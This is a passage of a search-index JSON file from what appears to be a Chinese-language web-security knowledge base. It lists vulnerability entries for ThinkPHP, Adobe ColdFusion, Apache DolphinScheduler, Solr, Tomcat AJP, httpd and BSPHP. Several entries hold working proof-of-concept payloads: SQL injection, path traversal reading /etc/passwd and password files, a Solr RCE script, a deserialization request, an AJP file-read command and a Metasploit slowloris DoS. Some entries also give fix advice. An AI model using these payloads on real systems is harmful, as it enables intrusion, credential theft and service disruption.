3.2.3","title":"\u5f71\u54cd\u8303\u56f4"},{"location":"Web%E5%AE%89%E5%85%A8/thinkphp/#poc","text":"/index.php/home/user?money[]=1123&user=liao&id[0]=bind&id[1]=0%20and%20(updatexml(1,concat(0x7e,(select%20user()),0x7e),1))","title":"\u6f0f\u6d1e\u9a8c\u8bc1POC"},{"location":"Web%E5%AE%89%E5%85%A8/Adminer/Adminer%20%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/","text":"Adminer \u670d\u52a1\u5668\u7aef\u8bf7\u6c42\u4f2a\u9020\u6f0f\u6d1e \u00b6 \u6700\u540e\u66f4\u65b0\u4e8e\uff1a2020-09-21 15:40:48 \u6f0f\u6d1e\u5f71\u54cd \u00b6 Adminer<=4.3.1 \u6f0f\u6d1ePOC \u00b6 POC","title":"Adminer \u670d\u52a1\u5668\u7aef\u8bf7\u6c42\u4f2a\u9020\u6f0f\u6d1e"},{"location":"Web%E5%AE%89%E5%85%A8/Adminer/Adminer%20%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/#adminer","text":"\u6700\u540e\u66f4\u65b0\u4e8e\uff1a2020-09-21 15:40:48","title":"Adminer \u670d\u52a1\u5668\u7aef\u8bf7\u6c42\u4f2a\u9020\u6f0f\u6d1e"},{"location":"Web%E5%AE%89%E5%85%A8/Adminer/Adminer%20%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/#_1","text":"Adminer<=4.3.1","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"Web%E5%AE%89%E5%85%A8/Adminer/Adminer%20%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/#poc","text":"POC","title":"\u6f0f\u6d1ePOC"},{"location":"Web%E5%AE%89%E5%85%A8/Adobe%20ColdFusion/Adobe%20ColdFusion%20%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/","text":"Adobe ColdFusion \u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e \u00b6 \u6700\u540e\u66f4\u65b0\u4e8e\uff1a2020-09-21 13:01:58 \u6f0f\u6d1e\u8303\u56f4 \u00b6 Adobe ColdFusion 8\u30019 \u6f0f\u6d1ePOC \u00b6 \u8bfb\u53d6etc/passwd http://your-ip:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en \u8bfb\u53d6\u540e\u53f0\u7ba1\u7406\u5458\u5bc6\u7801 http://your-ip:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en","title":"Adobe ColdFusion \u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e"},{"location":"Web%E5%AE%89%E5%85%A8/Adobe%20ColdFusion/Adobe%20ColdFusion%20%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#adobe-coldfusion","text":"\u6700\u540e\u66f4\u65b0\u4e8e\uff1a2020-09-21 13:01:58","title":"Adobe ColdFusion \u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e"},{"location":"Web%E5%AE%89%E5%85%A8/Adobe%20ColdFusion/Adobe%20ColdFusion%20%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#_1","text":"Adobe ColdFusion 8\u30019","title":"\u6f0f\u6d1e\u8303\u56f4"},{"location":"Web%E5%AE%89%E5%85%A8/Adobe%20ColdFusion/Adobe%20ColdFusion%20%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#poc","text":"\u8bfb\u53d6etc/passwd http://your-ip:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en \u8bfb\u53d6\u540e\u53f0\u7ba1\u7406\u5458\u5bc6\u7801 http://your-ip:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en","title":"\u6f0f\u6d1ePOC"},{"location":"Web%E5%AE%89%E5%85%A8/Apache/Apache%20Cocoon%20XML%20%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-11991%EF%BC%89/","text":"\u6f0f\u6d1e\u5f71\u54cd \u00b6 Apache Cocoon <= 2.1.12 \u6f0f\u6d1ePOC \u00b6 \u6784\u9020\u5185\u5bb9\u5982\u4e0b\uff0c\u5411/v2/api/product/manger/getInfo\u4f4d\u7f6e POST\u5982\u4e0b\u5185\u5bb9\u5373\u53ef","title":"Apache Cocoon XML \u5916\u90e8\u5b9e\u4f53\u6ce8\u5165\u6f0f\u6d1e\uff08CVE-2020-11991\uff09"},{"location":"Web%E5%AE%89%E5%85%A8/Apache/Apache%20Cocoon%20XML%20%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-11991%EF%BC%89/#_1","text":"Apache Cocoon <= 2.1.12","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"Web%E5%AE%89%E5%85%A8/Apache/Apache%20Cocoon%20XML%20%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-11991%EF%BC%89/#poc","text":"\u6784\u9020\u5185\u5bb9\u5982\u4e0b\uff0c\u5411/v2/api/product/manger/getInfo\u4f4d\u7f6e POST\u5982\u4e0b\u5185\u5bb9\u5373\u53ef","title":"\u6f0f\u6d1ePOC"},{"location":"Web%E5%AE%89%E5%85%A8/Apache/Apache%20DolphinScheduler%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-11974%E3%80%81CVE-2020-13922%EF%BC%89/","text":"\u6f0f\u6d1e\u63cf\u8ff0 \u00b6 Apache\u8f6f\u4ef6\u57fa\u91d1\u4f1a\u53d1\u5e03\u5b89\u5168\u516c\u544a\uff0c\u4fee\u590d\u4e86Apache DolphinScheduler\u6743\u9650\u8986\u76d6\u6f0f\u6d1e\uff08CVE-2020-13922\uff09\u4e0eApache DolphinScheduler\u8fdc\u7a0b\u6267\u884c\u4ee3\u7801\u6f0f\u6d1e\uff08CVE-2020-11974\uff09\u3002 CVE-2020-11974\u4e0emysql connectorj\u8fdc\u7a0b\u6267\u884c\u4ee3\u7801\u6f0f\u6d1e\u6709\u5173\uff0c\u5728\u9009\u62e9mysql\u4f5c\u4e3a\u6570\u636e\u5e93\u65f6\uff0c\u653b\u51fb\u8005\u53ef\u901a\u8fc7jdbc connect\u53c2\u6570\u8f93\u5165{\u201cdetectCustomCollations\u201d:true\uff0c\u201c autoDeserialize\u201d:true} \u5728DolphinScheduler \u670d\u52a1\u5668\u4e0a\u8fdc\u7a0b\u6267\u884c\u4ee3\u7801\u3002 CVE-2020-13922\u5bfc\u81f4\u666e\u901a\u7528\u6237\u53ef\u901a\u8fc7api interface\u5728DolphinScheduler \u7cfb\u7edf\u4e2d\u8986\u76d6\u5176\u4ed6\u7528\u6237\u7684\u5bc6\u7801\uff1aapi interface /dolphinscheduler/users/update\uff0c\u8bf7\u76f8\u5173\u7528\u6237\u53ca\u65f6\u5347\u7ea7\u8fdb\u884c\u9632\u62a4\u3002 \u5f71\u54cd\u8303\u56f4 \u00b6 Apache DolphinScheduler\u6743\u9650\u8986\u76d6\u6f0f\u6d1e\uff08CVE-2020-13922\uff09 \u53d7\u5f71\u54cd\u7248\u672c \u00b6 Apache DolphinScheduler = 1.2.0\u30011.2.1\u30011.3.1 \u4e0d\u53d7\u5f71\u54cd\u7248\u672c \u00b6 Apache DolphinScheduler >= 1.3.2 Apache DolphinScheduler\u8fdc\u7a0b\u6267\u884c\u4ee3\u7801\u6f0f\u6d1e\uff08CVE-2020-11974\uff09 \u5b83\u662f\u2f00\u4e2a\u5206\u5e03\u5f0f\u53bb\u4e2d\u2f3c\u5316\uff0c\u6613\u6269\u5c55\u7684\u53ef\u89c6\u5316DAG(\u6709\u5411\u2f46\u73af\u56fe)\u2f2f\u4f5c\u6d41\u4efb\u52a1\u8c03\u5ea6\u7cfb\u7edf\u3002\u5229\u2f64\u6f0f\u6d1e:\u9700\u8981\u767b\u5f55\u6743\u9650, [09/12 \u6001\u52bf\u611f\u77e5]\u63d0\u4f9b\u2f00\u7ec4\u9ed8\u8ba4\u5bc6\u7801\u3002 \u8be5\u6f0f\u6d1e\u5b58\u5728\u4e8e\u6570\u636e\u6e90\u4e2d\u2f3c\u672a\u9650\u5236\u6dfb\u52a0\u7684jdbc\u8fde\u63a5\u53c2\u6570,\u4ece\u2f7d\u5b9e\u73b0JDBC\u5ba2\u6237\u7aef\u53cd\u5e8f\u5217\u5316\u3002 1\u3001\u767b\u5f55\u5230\u2faf\u677f -> \u6570\u636e\u6e90\u4e2d\u2f3c\u3002 2\u3001jdbc\u8fde\u63a5\u53c2\u6570\u5c31\u662f\u4e3b\u2ec6,\u8fd9\u2fa5\u6ca1\u6709\u9650\u5236\u4efb\u610f\u7c7b\u578b\u7684\u8fde\u63a5\u4e32\u53c2\u6570\u3002 3\u3001\u5c06\u4ee5\u4e0b\u6570\u636e\u6dfb\u52a0\u5230jdbc\u8fde\u63a5\u53c2\u6570\u4e2d,\u5c31\u53ef\u4ee5\u76f4\u63a5\u89e6\u53d1\u3002 POST /dolphinscheduler/datasources/connect HTTP/1.1 type=MYSQL&name=test\u00ace=&host=127.0.0.1&port=3306&database=test& principal=&userName=root&password=root&connectType=& other={\"detectCustomCollations\":true,\"autoDeserialize\":true} #### \u53d7\u5f71\u54cd\u7248\u672c Apache DolphinScheduler = 1.2.0\u30011.2.1 #### \u4e0d\u53d7\u5f71\u54cd\u7248\u672c Apache DolphinScheduler >= 1.3.1 #### \u4fee\u590d\u5efa\u8bae \u5b98\u65b9\u5347\u7ea7 \u76ee\u524d\u5b98\u65b9\u5df2\u5728\u6700\u65b0\u7248\u672c\u4e2d\u4fee\u590d\u4e86\u6b64\u6b21\u7684\u6f0f\u6d1e\uff0c\u8bf7\u53d7\u5f71\u54cd\u7684\u7528\u6237\u5c3d\u5feb\u5347\u7ea7\u7248\u672c\u81f31.3.2\u8fdb\u884c\u9632\u62a4\u3002 \u5b98\u65b9\u4e0b\u8f7d\u94fe\u63a5\uff1a https://dolphinscheduler.apache.org/zhcn/docs/release/download.html","title":"Apache DolphinScheduler\u9ad8\u5371\u6f0f\u6d1e\uff08CVE-2020-11974\u3001CVE-2020-13922\uff09"},{"location":"Web%E5%AE%89%E5%85%A8/Apache/Apache%20DolphinScheduler%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-11974%E3%80%81CVE-2020-13922%EF%BC%89/#_1","text":"Apache\u8f6f\u4ef6\u57fa\u91d1\u4f1a\u53d1\u5e03\u5b89\u5168\u516c\u544a\uff0c\u4fee\u590d\u4e86Apache DolphinScheduler\u6743\u9650\u8986\u76d6\u6f0f\u6d1e\uff08CVE-2020-13922\uff09\u4e0eApache DolphinScheduler\u8fdc\u7a0b\u6267\u884c\u4ee3\u7801\u6f0f\u6d1e\uff08CVE-2020-11974\uff09\u3002 CVE-2020-11974\u4e0emysql connectorj\u8fdc\u7a0b\u6267\u884c\u4ee3\u7801\u6f0f\u6d1e\u6709\u5173\uff0c\u5728\u9009\u62e9mysql\u4f5c\u4e3a\u6570\u636e\u5e93\u65f6\uff0c\u653b\u51fb\u8005\u53ef\u901a\u8fc7jdbc connect\u53c2\u6570\u8f93\u5165{\u201cdetectCustomCollations\u201d:true\uff0c\u201c autoDeserialize\u201d:true} \u5728DolphinScheduler \u670d\u52a1\u5668\u4e0a\u8fdc\u7a0b\u6267\u884c\u4ee3\u7801\u3002 CVE-2020-13922\u5bfc\u81f4\u666e\u901a\u7528\u6237\u53ef\u901a\u8fc7api interface\u5728DolphinScheduler \u7cfb\u7edf\u4e2d\u8986\u76d6\u5176\u4ed6\u7528\u6237\u7684\u5bc6\u7801\uff1aapi interface /dolphinscheduler/users/update\uff0c\u8bf7\u76f8\u5173\u7528\u6237\u53ca\u65f6\u5347\u7ea7\u8fdb\u884c\u9632\u62a4\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"Web%E5%AE%89%E5%85%A8/Apache/Apache%20DolphinScheduler%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-11974%E3%80%81CVE-2020-13922%EF%BC%89/#_2","text":"Apache DolphinScheduler\u6743\u9650\u8986\u76d6\u6f0f\u6d1e\uff08CVE-2020-13922\uff09","title":"\u5f71\u54cd\u8303\u56f4"},{"location":"Web%E5%AE%89%E5%85%A8/Apache/Apache%20DolphinScheduler%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-11974%E3%80%81CVE-2020-13922%EF%BC%89/#_3","text":"Apache DolphinScheduler = 1.2.0\u30011.2.1\u30011.3.1","title":"\u53d7\u5f71\u54cd\u7248\u672c"},{"location":"Web%E5%AE%89%E5%85%A8/Apache/Apache%20DolphinScheduler%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-11974%E3%80%81CVE-2020-13922%EF%BC%89/#_4","text":"Apache DolphinScheduler >= 1.3.2 Apache DolphinScheduler\u8fdc\u7a0b\u6267\u884c\u4ee3\u7801\u6f0f\u6d1e\uff08CVE-2020-11974\uff09 \u5b83\u662f\u2f00\u4e2a\u5206\u5e03\u5f0f\u53bb\u4e2d\u2f3c\u5316\uff0c\u6613\u6269\u5c55\u7684\u53ef\u89c6\u5316DAG(\u6709\u5411\u2f46\u73af\u56fe)\u2f2f\u4f5c\u6d41\u4efb\u52a1\u8c03\u5ea6\u7cfb\u7edf\u3002\u5229\u2f64\u6f0f\u6d1e:\u9700\u8981\u767b\u5f55\u6743\u9650, [09/12 \u6001\u52bf\u611f\u77e5]\u63d0\u4f9b\u2f00\u7ec4\u9ed8\u8ba4\u5bc6\u7801\u3002 \u8be5\u6f0f\u6d1e\u5b58\u5728\u4e8e\u6570\u636e\u6e90\u4e2d\u2f3c\u672a\u9650\u5236\u6dfb\u52a0\u7684jdbc\u8fde\u63a5\u53c2\u6570,\u4ece\u2f7d\u5b9e\u73b0JDBC\u5ba2\u6237\u7aef\u53cd\u5e8f\u5217\u5316\u3002 1\u3001\u767b\u5f55\u5230\u2faf\u677f -> \u6570\u636e\u6e90\u4e2d\u2f3c\u3002 2\u3001jdbc\u8fde\u63a5\u53c2\u6570\u5c31\u662f\u4e3b\u2ec6,\u8fd9\u2fa5\u6ca1\u6709\u9650\u5236\u4efb\u610f\u7c7b\u578b\u7684\u8fde\u63a5\u4e32\u53c2\u6570\u3002 3\u3001\u5c06\u4ee5\u4e0b\u6570\u636e\u6dfb\u52a0\u5230jdbc\u8fde\u63a5\u53c2\u6570\u4e2d,\u5c31\u53ef\u4ee5\u76f4\u63a5\u89e6\u53d1\u3002 POST /dolphinscheduler/datasources/connect HTTP/1.1 type=MYSQL&name=test\u00ace=&host=127.0.0.1&port=3306&database=test& principal=&userName=root&password=root&connectType=& other={\"detectCustomCollations\":true,\"autoDeserialize\":true} #### \u53d7\u5f71\u54cd\u7248\u672c Apache DolphinScheduler = 1.2.0\u30011.2.1 #### \u4e0d\u53d7\u5f71\u54cd\u7248\u672c Apache DolphinScheduler >= 1.3.1 #### \u4fee\u590d\u5efa\u8bae \u5b98\u65b9\u5347\u7ea7 \u76ee\u524d\u5b98\u65b9\u5df2\u5728\u6700\u65b0\u7248\u672c\u4e2d\u4fee\u590d\u4e86\u6b64\u6b21\u7684\u6f0f\u6d1e\uff0c\u8bf7\u53d7\u5f71\u54cd\u7684\u7528\u6237\u5c3d\u5feb\u5347\u7ea7\u7248\u672c\u81f31.3.2\u8fdb\u884c\u9632\u62a4\u3002 \u5b98\u65b9\u4e0b\u8f7d\u94fe\u63a5\uff1a https://dolphinscheduler.apache.org/zhcn/docs/release/download.html","title":"\u4e0d\u53d7\u5f71\u54cd\u7248\u672c"},{"location":"Web%E5%AE%89%E5%85%A8/Apache/Apache%20Httpd%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u5f71\u54cd \u00b6 Apache httpd2.4.0~2.4.29 \u6f0f\u6d1e\u9a8c\u8bc1 \u00b6 1.a.php\u6587\u4ef6 \u5185\u5bb9\uff1a ``` ``` 2.\u4e0a\u4f20a.php\u5e76\u6293\u5305 3.\u4fee\u6539a.php HEX\u7684\u540e\u9762\u52a0\u4e0a0a\u540e\u653e\u5305 4.\u6587\u4ef6\u4e0a\u4f20\u6210\u529f 5.\u8bbf\u95eea.php,\u540e\u7f00\u52a0\u4e0a%0A","title":"Apache Httpd\u6362\u884c\u89e3\u6790\u6f0f\u6d1e"},{"location":"Web%E5%AE%89%E5%85%A8/Apache/Apache%20Httpd%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/#_1","text":"Apache httpd2.4.0~2.4.29","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"Web%E5%AE%89%E5%85%A8/Apache/Apache%20Httpd%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/#_2","text":"1.a.php\u6587\u4ef6 \u5185\u5bb9\uff1a ``` ``` 2.\u4e0a\u4f20a.php\u5e76\u6293\u5305 3.\u4fee\u6539a.php HEX\u7684\u540e\u9762\u52a0\u4e0a0a\u540e\u653e\u5305 4.\u6587\u4ef6\u4e0a\u4f20\u6210\u529f 5.\u8bbf\u95eea.php,\u540e\u7f00\u52a0\u4e0a%0A","title":"\u6f0f\u6d1e\u9a8c\u8bc1"},{"location":"Web%E5%AE%89%E5%85%A8/Apache/Apache%20Solr%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20CVE-2019-0193/","text":"\u5f71\u54cd\u7248\u672c apache solr 5.x-8.2.0,\u5b58\u5728config API\u7248\u672c \u83b7\u53d6\u6240\u6709 core \u4fe1\u606f\uff1acurl http://IP/solr/admin/cores HTTP\u534f\u8bae\u5934\uff1aPOST /solr//dataimport POC POST /solr/<your_core_name>/dataimport HTTP/1.1 Host: 127.0.0.1:8983 Content-Length: 763 User-Agent: Mozilla/5.0 Content-type: application/x-www-form-urlencoded Connection: close command=full-import&verbose=false&clean=false&commit=true&debug=true&core=<your_core_name>&name=dataimport&dataConfig= <dataConfig> <dataSource type=\"URLDataSource\"></dataSource> <script><![CDATA[ function poc(row){ var process= java.lang.Runtime.getRuntime(); process.exec(\"calc\"); return row; } ]]></script> <document> <entity name=\"stackoverflow\" url=\"https://stackoverflow.com/feeds/tag/solr\" processor=\"XPathEntityProcessor\" forEach=\"/feed\" transformer=\"script:poc\" ></entity> </document> </dataConfig>","title":"Apache Solr\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c CVE-2019-0193"},{"location":"Web%E5%AE%89%E5%85%A8/Apache/Apache-Tomcat-Ajp%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABCVE-2020-1938/","text":"\u5f71\u54cd\u8303\u56f4 \u00b6 Apache Tomcat 6 Apache Tomcat 7 < 7.0.100 Apache Tomcat 8 < 8.5.51 Apache Tomcat 9 < 9.0.31 \u6f0f\u6d1e\u7b80\u4ecb \u00b6 Apache Tomcat\u670d\u52a1\u5668\u5b58\u5728\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u5229\u7528\u8be5\u6f0f\u6d1e\u8bfb\u53d6\u6216\u5305\u542b Tomcat \u4e0a\u6240\u6709 webapp \u76ee\u5f55\u4e0b\u7684\u4efb\u610f\u6587\u4ef6\uff0c\u5982\uff1awebapp \u914d\u7f6e\u6587\u4ef6\u6216\u6e90\u4ee3\u7801\u7b49\u3002 \u7531\u4e8eTomcat\u9ed8\u8ba4\u5f00\u542f\u7684AJP\u670d\u52a1\uff088009\u7aef\u53e3\uff09\u5b58\u5728\u4e00\u5904\u6587\u4ef6\u5305\u542b\u7f3a\u9677\uff0c\u653b\u51fb\u8005\u53ef\u6784\u9020\u6076\u610f\u7684\u8bf7\u6c42\u5305\u8fdb\u884c\u6587\u4ef6\u5305\u542b\u64cd\u4f5c\uff0c\u8fdb\u800c\u8bfb\u53d6\u53d7\u5f71\u54cdTomcat\u670d\u52a1\u5668\u4e0a\u7684Web\u76ee\u5f55\u6587\u4ef6\u3002 \u590d\u73b0\u5229\u7528 \u00b6 \u642d\u5efa\u73af\u5883 \u514b\u9686\u5b9e\u9a8c\u73af\u5883 git clone https://github.com/laolisafe/CVE-2020-1938 \u89e3\u538bApache unzip apache-tomcat-8.5.32.zip \u5728Apache\u7684bin\u76ee\u5f55\u4e0b\uff0c\u6dfb\u52a0\u6267\u884c\u6743\u9650\uff0c\u6211\u8fd9\u91cc\u7ed9\u5168\u90e8\u6743\u9650 chmod -R +x bin/ \u542f\u52a8apache sh startup.sh \u67e5\u770b\u7aef\u53e3\uff0c8009\u7aef\u53e3\u662f\u5f00\u542f\u7684 \u5229\u7528\u6f0f\u6d1e poc\u4e0b\u8f7d\u5730\u5740\uff1a https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi \u6ce8\u610fpoc\u4e3apy2\u73af\u5883 python ./ CNVD-2020-10487-Tomcat-Ajp-lfi.py \u672c\u5730ip \u2013p 8009 \u2013f WEB-INF/web.xml \u6f0f\u6d1e\u4fee\u590d\u5efa\u8bae \u00b6 1.\u4e34\u65f6\u7981\u7528AJP\u534f\u8bae\u7aef\u53e3\uff0c\u5728conf/server.xml\u914d\u7f6e\u6587\u4ef6\u4e2d\u6ce8\u91ca\u6389 2\u3001\u914d\u7f6eajp\u914d\u7f6e\u4e2d\u7684secretRequired\u8ddfsecret\u5c5e\u6027\u6765\u9650\u5236\u8ba4\u8bc1 3\u3001\u5b98\u65b9\u4e0b\u8f7d\u6700\u65b0\u7248\u4e0b\u8f7d\u5730\u5740\uff1a https://tomcat.apache.org/download-70.cgi https://tomcat.apache.org/download-80.cgi https://tomcat.apache.org/download-90.cgi","title":"Apache-Tomcat-Ajp\u6587\u4ef6\u5305\u542bCVE-2020-1938"},{"location":"Web%E5%AE%89%E5%85%A8/Apache/Apache-Tomcat-Ajp%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABCVE-2020-1938/#_1","text":"Apache Tomcat 6 Apache Tomcat 7 < 7.0.100 Apache Tomcat 8 < 8.5.51 Apache Tomcat 9 < 9.0.31","title":"\u5f71\u54cd\u8303\u56f4"},{"location":"Web%E5%AE%89%E5%85%A8/Apache/Apache-Tomcat-Ajp%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABCVE-2020-1938/#_2","text":"Apache Tomcat\u670d\u52a1\u5668\u5b58\u5728\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u5229\u7528\u8be5\u6f0f\u6d1e\u8bfb\u53d6\u6216\u5305\u542b Tomcat \u4e0a\u6240\u6709 webapp \u76ee\u5f55\u4e0b\u7684\u4efb\u610f\u6587\u4ef6\uff0c\u5982\uff1awebapp \u914d\u7f6e\u6587\u4ef6\u6216\u6e90\u4ee3\u7801\u7b49\u3002 \u7531\u4e8eTomcat\u9ed8\u8ba4\u5f00\u542f\u7684AJP\u670d\u52a1\uff088009\u7aef\u53e3\uff09\u5b58\u5728\u4e00\u5904\u6587\u4ef6\u5305\u542b\u7f3a\u9677\uff0c\u653b\u51fb\u8005\u53ef\u6784\u9020\u6076\u610f\u7684\u8bf7\u6c42\u5305\u8fdb\u884c\u6587\u4ef6\u5305\u542b\u64cd\u4f5c\uff0c\u8fdb\u800c\u8bfb\u53d6\u53d7\u5f71\u54cdTomcat\u670d\u52a1\u5668\u4e0a\u7684Web\u76ee\u5f55\u6587\u4ef6\u3002","title":"\u6f0f\u6d1e\u7b80\u4ecb"},{"location":"Web%E5%AE%89%E5%85%A8/Apache/Apache-Tomcat-Ajp%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABCVE-2020-1938/#_3","text":"\u642d\u5efa\u73af\u5883 \u514b\u9686\u5b9e\u9a8c\u73af\u5883 git clone https://github.com/laolisafe/CVE-2020-1938 \u89e3\u538bApache unzip apache-tomcat-8.5.32.zip \u5728Apache\u7684bin\u76ee\u5f55\u4e0b\uff0c\u6dfb\u52a0\u6267\u884c\u6743\u9650\uff0c\u6211\u8fd9\u91cc\u7ed9\u5168\u90e8\u6743\u9650 chmod -R +x bin/ \u542f\u52a8apache sh startup.sh \u67e5\u770b\u7aef\u53e3\uff0c8009\u7aef\u53e3\u662f\u5f00\u542f\u7684 \u5229\u7528\u6f0f\u6d1e poc\u4e0b\u8f7d\u5730\u5740\uff1a https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi \u6ce8\u610fpoc\u4e3apy2\u73af\u5883 python ./ CNVD-2020-10487-Tomcat-Ajp-lfi.py \u672c\u5730ip \u2013p 8009 \u2013f WEB-INF/web.xml","title":"\u590d\u73b0\u5229\u7528"},{"location":"Web%E5%AE%89%E5%85%A8/Apache/Apache-Tomcat-Ajp%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABCVE-2020-1938/#_4","text":"1.\u4e34\u65f6\u7981\u7528AJP\u534f\u8bae\u7aef\u53e3\uff0c\u5728conf/server.xml\u914d\u7f6e\u6587\u4ef6\u4e2d\u6ce8\u91ca\u6389 2\u3001\u914d\u7f6eajp\u914d\u7f6e\u4e2d\u7684secretRequired\u8ddfsecret\u5c5e\u6027\u6765\u9650\u5236\u8ba4\u8bc1 3\u3001\u5b98\u65b9\u4e0b\u8f7d\u6700\u65b0\u7248\u4e0b\u8f7d\u5730\u5740\uff1a https://tomcat.apache.org/download-70.cgi https://tomcat.apache.org/download-80.cgi https://tomcat.apache.org/download-90.cgi","title":"\u6f0f\u6d1e\u4fee\u590d\u5efa\u8bae"},{"location":"Web%E5%AE%89%E5%85%A8/Apache/Apache%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u5f71\u54cd \u00b6 Apache 1.x/2.x \u6f0f\u6d1e\u5229\u7528 \u00b6 nmap\u4f7f\u7528-sV\u626b\u63cf\u670d\u52a1\u5668\u83b7\u53d6\u670d\u52a1\u7248\u672c msf\u5229\u7528\u6b65\u9aa4\u5982\u4e0b``` 1.msfconsole(\u542f\u52a8metasploit) 2.use auxiliary/dos/http/slowloris(\u4f7f\u7528\u6a21\u5757) 3.set RHOST targetip(\u8bbe\u7f6e\u76ee\u6807IP) 4.run(\u6267\u884c\u653b\u51fb)","title":"Apache\u62d2\u7edd\u670d\u52a1\u6f0f\u6d1e"},{"location":"Web%E5%AE%89%E5%85%A8/Apache/Apache%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E/#_1","text":"Apache 1.x/2.x","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"Web%E5%AE%89%E5%85%A8/Apache/Apache%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E/#_2","text":"nmap\u4f7f\u7528-sV\u626b\u63cf\u670d\u52a1\u5668\u83b7\u53d6\u670d\u52a1\u7248\u672c msf\u5229\u7528\u6b65\u9aa4\u5982\u4e0b``` 1.msfconsole(\u542f\u52a8metasploit) 2.use auxiliary/dos/http/slowloris(\u4f7f\u7528\u6a21\u5757) 3.set RHOST targetip(\u8bbe\u7f6e\u76ee\u6807IP) 4.run(\u6267\u884c\u653b\u51fb)","title":"\u6f0f\u6d1e\u5229\u7528"},{"location":"Web%E5%AE%89%E5%85%A8/BSPHP/BSPHP%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/","text":"BSPHP\u5b58\u5728\u672a\u6388\u6743\u8bbf\u95ee \u00b6 \u6700\u540e\u66f4\u65b0\u4e8e\uff1a2020-09-26 18:42:19 \u8be5\u5904\u6cc4\u6f0f\u7684\u2f64\u6237\u540d\u548c\u767b\u9646ip /admin/index.php?m=admin&c=log&a=table_json&json=get&soso_ok=1&t=user_login_log&page=1&limit=10&","title":"BSPHP\u5b58\u5728\u672a\u6388\u6743\u8bbf\u95ee"},{"location":"Web%E5%AE%89%E5%85%A8/BSPHP/BSPHP%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/#bsphp","text":"\u6700\u540e\u66f4\u65b0\u4e8e\uff1a2020-09-26 18:42:19 \u8be5\u5904\u6cc4\u6f0f\u7684\u2f64\u6237\u540d\u548c\u767b\u9646ip 